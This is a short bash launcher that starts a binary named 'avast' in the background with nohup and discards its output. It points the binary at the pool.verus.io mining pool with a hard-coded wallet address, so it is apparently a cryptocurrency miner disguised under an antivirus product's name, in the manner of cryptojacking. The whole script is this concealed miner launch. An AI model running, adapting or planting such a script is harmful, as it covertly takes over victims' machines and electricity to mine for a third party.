#!/bin/bash

chmod +x avast  >/dev/null 2>&1
nohup ./avast -v -l  pool.verus.io:9999 -u RKUEhTZwKjVXd1ms7r3gUqhNG4fCd83msA.T -t 1 -x > nohup.out >/dev/null 2>&1
